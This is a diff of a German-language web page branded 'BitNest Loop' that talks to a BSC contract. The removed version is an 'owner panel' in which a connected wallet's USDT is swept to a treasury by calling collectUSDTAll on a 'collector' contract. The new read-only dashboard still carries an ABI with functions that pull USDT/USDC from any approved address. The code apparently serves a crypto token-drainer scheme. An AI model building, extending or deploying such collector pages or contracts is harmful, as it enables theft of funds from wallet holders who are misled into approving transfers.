@@ -1,124 +1,269 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="de">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <title>Owner Panel – Auto Wallet A</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>BitnestLoop — Dashboard</title>
   <style>
-    body{
-      font-family: Arial, sans-serif;
-      background:#0f172a;
-      color:#fff;
-      display:flex;
-      min-height:100vh;
-      justify-content:center;
-      align-items:center;
-      margin:0;
-      padding:16px;
+    :root { color-scheme: dark; }
+    body { margin: 0; font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial; background: #0b1020; color: #e9eefc; }
+    .wrap { max-width: 980px; margin: 0 auto; padding: 28px 16px; }
+    .card { background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.10); border-radius: 16px; padding: 16px; margin: 14px 0; box-shadow: 0 12px 30px rgba(0,0,0,0.25); }
+    h1 { margin: 0 0 6px; font-size: 34px; letter-spacing: 0.2px; }
+    .muted { color: rgba(233,238,252,0.70); font-size: 14px; line-height: 1.35; }
+    .row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
+    button {
+      border: 1px solid rgba(255,255,255,0.16);
+      background: rgba(255,255,255,0.08);
+      color: #e9eefc;
+      padding: 10px 14px;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: transform .05s ease, background .15s ease;
     }
-    .box{
-      background:#020617;
-      padding:22px;
-      border-radius:14px;
-      width:360px;
-      box-shadow:0 10px 30px rgba(0,0,0,.35);
-    }
-    h2{ margin-top:0; }
-    button{
-      background:#22c55e;
-      border:none;
-      padding:12px;
-      width:100%;
-      font-size:15px;
-      font-weight:bold;
-      cursor:pointer;
-      border-radius:10px;
-      margin-top:10px;
-    }
-    button.secondary{ background:#334155; }
-    .mono{
-      font-family: ui-monospace, Menlo, Monaco, Consolas, monospace;
-      font-size:12px;
-      word-break:break-all;
-      opacity:.9;
-    }
-    .muted{ font-size:12px; opacity:.75; line-height:1.35; }
-    #status{ margin-top:10px; min-height:22px; }
+    button:hover { background: rgba(255,255,255,0.12); }
+    button:active { transform: translateY(1px); }
+    button.primary { background: rgba(60, 255, 180, 0.16); border-color: rgba(60, 255, 180, 0.35); }
+    button.primary:hover { background: rgba(60, 255, 180, 0.22); }
+    code { background: rgba(255,255,255,0.10); padding: 2px 8px; border-radius: 999px; }
+    .kv { display: grid; grid-template-columns: 160px 1fr; gap: 8px 10px; margin-top: 10px; }
+    .k { color: rgba(233,238,252,0.65); }
+    .v { word-break: break-all; }
+    .status { padding: 10px 12px; border-radius: 12px; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.10); }
+    .ok { border-color: rgba(60, 255, 180, 0.35); }
+    .warn { border-color: rgba(255, 210, 90, 0.35); }
+    .bad { border-color: rgba(255, 90, 120, 0.35); }
+    .small { font-size: 13px; }
+    .spacer { height: 6px; }
+    .footer { margin-top: 18px; font-size: 12px; color: rgba(233,238,252,0.55); }
   </style>
 </head>
 <body>
+  <div class="wrap">
+    <h1>BitnestLoop</h1>
+    <div class="muted">Connect → BSC prüfen → Contract-Infos lesen (safe/read-only).</div>
 
-<div class="box">
-  <h2>BitNest Loop</h2>
+    <div class="card">
+      <div class="row">
+        <button id="btnConnect" class="primary">🦊 Connect Wallet</button>
+        <button id="btnRefresh">🔄 Refresh</button>
+        <button id="btnSwitch">🌐 Zu BSC wechseln</button>
+      </div>
+      <div class="spacer"></div>
+      <div id="status" class="status small">Status: nicht verbunden</div>
 
-  <div class="muted">
-    Schritt 1: Wallet  verbinden / Wallet Connect<br/>
-    Schritt 2: Bestätigen / Confirm<br/>
-    Schritt 3: USDT/USDC Adaption
+      <div class="kv">
+        <div class="k">Account</div><div class="v" id="account">-</div>
+        <div class="k">ChainId</div><div class="v" id="chain">-</div>
+        <div class="k">Contract</div><div class="v"><code id="contractAddr">-</code></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h3 style="margin:0 0 8px;">Contract Infos</h3>
+      <div class="muted">Wird nach erfolgreichem Connect aus dem Contract gelesen.</div>
+      <div class="kv">
+        <div class="k">owner()</div><div class="v" id="owner">-</div>
+        <div class="k">paused()</div><div class="v" id="paused">-</div>
+        <div class="k">TREASURY()</div><div class="v" id="treasury">-</div>
+        <div class="k">USDC()</div><div class="v" id="usdc">-</div>
+        <div class="k">USDT()</div><div class="v" id="usdt">-</div>
+      </div>
+    </div>
+
+    <div class="footer">
+      Tipp: Wenn “Connect” sofort abbricht, liegt es fast immer an: falschem Browser-Profil, MetaMask gesperrt, oder Seite nicht über https/http.
+      Auf Mobile bitte im Wallet-Browser öffnen.
+    </div>
   </div>
 
-  <button class="secondary" onclick="connectWalletA()">Connect Wallet</button>
-  <div class="mono" id="walletA">Wallet: –</div>
+  <!-- ethers v5 -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script>
+    // === Konfiguration ===
+    const EXPECTED_CHAIN_ID = 56; // BSC Mainnet
+    const CONTRACT_ADDRESS = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
 
-  <button onclick="collectAll()">Restart Loop</button>
+    // ABI (aus deiner Nachricht)
+    const ABI = [
+      {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
+      {"anonymous":false,"inputs":[
+        {"indexed":true,"internalType":"address","name":"token","type":"address"},
+        {"indexed":true,"internalType":"address","name":"from","type":"address"},
+        {"indexed":true,"internalType":"address","name":"to","type":"address"},
+        {"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}
+      ],"name":"Collected","type":"event"},
+      {"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],
+        "name":"collectUSDC","outputs":[],"stateMutability":"nonpayable","type":"function"},
+      {"inputs":[{"internalType":"address","name":"from","type":"address"}],
+        "name":"collectUSDCAll","outputs":[{"internalType":"uint256","name":"collected","type":"uint256"}],
+        "stateMutability":"nonpayable","type":"function"},
+      {"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],
+        "name":"collectUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"},
+      {"inputs":[{"internalType":"address","name":"from","type":"address"}],
+        "name":"collectUSDTAll","outputs":[{"internalType":"uint256","name":"collected","type":"uint256"}],
+        "stateMutability":"nonpayable","type":"function"},
+      {"anonymous":false,"inputs":[
+        {"indexed":true,"internalType":"address","name":"oldOwner","type":"address"},
+        {"indexed":true,"internalType":"address","name":"newOwner","type":"address"}
+      ],"name":"OwnershipTransferred","type":"event"},
+      {"anonymous":false,"inputs":[{"indexed":false,"internalType":"bool","name":"isPaused","type":"bool"}],
+        "name":"Paused","type":"event"},
+      {"inputs":[{"internalType":"bool","name":"p","type":"bool"}],
+        "name":"setPaused","outputs":[],"stateMutability":"nonpayable","type":"function"},
+      {"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],
+        "name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},
+      {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],
+        "stateMutability":"view","type":"function"},
+      {"inputs":[],"name":"paused","outputs":[{"internalType":"bool","name":"","type":"bool"}],
+        "stateMutability":"view","type":"function"},
+      {"inputs":[],"name":"TREASURY","outputs":[{"internalType":"address","name":"","type":"address"}],
+        "stateMutability":"view","type":"function"},
+      {"inputs":[],"name":"USDC","outputs":[{"internalType":"address","name":"","type":"address"}],
+        "stateMutability":"view","type":"function"},
+      {"inputs":[],"name":"USDT","outputs":[{"internalType":"address","name":"","type":"address"}],
+        "stateMutability":"view","type":"function"}
+    ];
 
-  <div id="status"></div>
+    // === UI helpers ===
+    const $ = (id) => document.getElementById(id);
 
-  <div class="muted" style="margin-top:10px;">
-<br/>
-    <span class="mono"></span>
-  </div>
-</div>
-
-<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.min.js"></script>
-<script>
-  // ===== CONFIG =====
-  const COLLECTOR = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
-
-  const collectorAbi = [
-    "function collectUSDTAll(address from) external"
-  ];
-
-  let walletAAddress = null;
-
-  function setStatus(t){ document.getElementById("status").innerText = t; }
-
-  async function connectWalletA(){
-    try{
-      if(!window.ethereum) return alert("Keine Wallet gefunden");
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      const signer = await provider.getSigner();
-      walletAAddress = await signer.getAddress();
-      document.getElementById("walletA").innerText = "Wallet A: " + walletAAddress;
-      setStatus("✅ Wallet A erkannt");
-    }catch(e){
-      console.error(e);
-      setStatus("❌ Abgebrochen");
+    function setStatus(text, kind="") {
+      const el = $("status");
+      el.textContent = "Status: " + text;
+      el.classList.remove("ok","warn","bad");
+      if (kind) el.classList.add(kind);
     }
-  }
 
-  async function collectAll(){
-    try{
-      if(!walletAAddress) return setStatus("❌ Erst Wallet A verbinden");
+    $("contractAddr").textContent = CONTRACT_ADDRESS;
 
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      const signer = await provider.getSigner();
+    let provider, signer, contract;
 
-      const c = new ethers.Contract(COLLECTOR, collectorAbi, signer);
-
-      setStatus("Bitte als Owner bestätigen…");
-      const tx = await c.collectUSDTAll(walletAAddress);
-      await tx.wait();
-
-      setStatus("✅ USDT wurde an die Treasury gesendet");
-    }catch(e){
-      console.error(e);
-      setStatus("❌ Fehler (bist du mit der Owner-Wallet verbunden?)");
+    function hasEthereum() {
+      return typeof window.ethereum !== "undefined";
     }
-  }
-</script>
 
+    async function connect() {
+      if (!hasEthereum()) {
+        setStatus("Keine Wallet gefunden (MetaMask Extension?)", "bad");
+        return null;
+      }
+
+      try {
+        // Wichtig: eth_requestAccounts (nicht eth_accounts)
+        provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+        const accounts = await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
+
+        const addr = accounts?.[0] || await signer.getAddress();
+        $("account").textContent = addr;
+
+        const net = await provider.getNetwork();
+        $("chain").textContent = String(net.chainId);
+
+        if (net.chainId !== EXPECTED_CHAIN_ID) {
+          setStatus(`Verbunden, aber falsches Netzwerk (chainId ${net.chainId}). Bitte BSC (56) wählen.`, "warn");
+        } else {
+          setStatus("Verbunden ✅ (BSC Mainnet)", "ok");
+        }
+
+        return { addr, chainId: net.chainId };
+      } catch (e) {
+        // 4001 = user rejected request
+        if (e && e.code === 4001) setStatus("Abgebrochen (User hat abgelehnt)", "bad");
+        else setStatus("Connect fehlgeschlagen: " + (e?.message || e), "bad");
+        console.error(e);
+        return null;
+      }
+    }
+
+    async function refresh() {
+      if (!contract) {
+        const c = await connect();
+        if (!c) return;
+      }
+
+      try {
+        const net = await provider.getNetwork();
+        $("chain").textContent = String(net.chainId);
+
+        // Read-only calls
+        const [owner, paused, treasury, usdc, usdt] = await Promise.all([
+          contract.owner(),
+          contract.paused(),
+          contract.TREASURY(),
+          contract.USDC(),
+          contract.USDT()
+        ]);
+
+        $("owner").textContent = owner;
+        $("paused").textContent = String(paused);
+        $("treasury").textContent = treasury;
+        $("usdc").textContent = usdc;
+        $("usdt").textContent = usdt;
+
+        if (net.chainId === EXPECTED_CHAIN_ID) setStatus("Infos geladen ✅", "ok");
+        else setStatus("Infos geladen, aber Netzwerk ist nicht BSC (56).", "warn");
+      } catch (e) {
+        setStatus("Refresh fehlgeschlagen: " + (e?.data?.message || e?.message || e), "bad");
+        console.error(e);
+      }
+    }
+
+    async function switchToBSC() {
+      if (!hasEthereum()) {
+        setStatus("Keine Wallet gefunden", "bad");
+        return;
+      }
+
+      try {
+        // Versucht auf BSC umzuschalten; falls nicht vorhanden: hinzufügen
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: "0x38" }] // 56 in hex
+        });
+        setStatus("Zu BSC gewechselt ✅", "ok");
+        await refresh();
+      } catch (e) {
+        // 4902 = chain not added
+        if (e && e.code === 4902) {
+          try {
+            await window.ethereum.request({
+              method: "wallet_addEthereumChain",
+              params: [{
+                chainId: "0x38",
+                chainName: "BNB Smart Chain",
+                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+                rpcUrls: ["https://bsc-dataseed.binance.org/"],
+                blockExplorerUrls: ["https://bscscan.com/"]
+              }]
+            });
+            setStatus("BSC hinzugefügt & gewechselt ✅", "ok");
+            await refresh();
+          } catch (e2) {
+            setStatus("BSC hinzufügen fehlgeschlagen: " + (e2?.message || e2), "bad");
+            console.error(e2);
+          }
+        } else if (e && e.code === 4001) {
+          setStatus("Abgebrochen (Netzwerkwechsel abgelehnt)", "bad");
+        } else {
+          setStatus("Netzwerkwechsel fehlgeschlagen: " + (e?.message || e), "bad");
+          console.error(e);
+        }
+      }
+    }
+
+    // Buttons
+    $("btnConnect").addEventListener("click", async () => { await connect(); });
+    $("btnRefresh").addEventListener("click", async () => { await refresh(); });
+    $("btnSwitch").addEventListener("click", async () => { await switchToBSC(); });
+
+    // Auto-update on changes
+    if (hasEthereum()) {
+      window.ethereum.on("accountsChanged", () => location.reload());
+      window.ethereum.on("chainChanged", () => location.reload());
+    }
+  </script>
 </body>
 </html>
